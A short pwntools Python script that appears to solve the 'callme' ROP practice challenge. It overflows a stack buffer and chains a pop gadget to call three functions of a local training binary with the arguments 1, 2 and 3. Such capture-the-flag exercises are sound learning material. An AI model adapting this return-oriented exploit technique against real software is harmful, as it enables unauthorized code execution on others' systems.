from pwn import *

sh = process('./callme')
elf = ELF('./callme')

one_addr = elf.symbols['callme_one']
two_addr = elf.symbols['callme_two']
thr_addr = elf.symbols['callme_three']

rop_addr = 0x401ab0

payload_start = 'a' * (0x20 + 0x8)
payload_one = p64(rop_addr) + p64(1) + p64(2) + p64(3) + p64(one_addr)
payload_two = p64(rop_addr) + p64(1) + p64(2) + p64(3) + p64(two_addr)
payload_thr = p64(rop_addr) + p64(1) + p64(2) + p64(3) + p64(thr_addr)

payload = payload_start + payload_one + payload_two + payload_thr

sh.recvuntil('>')
sh.sendline(payload)

sh.interactive()
sh.close()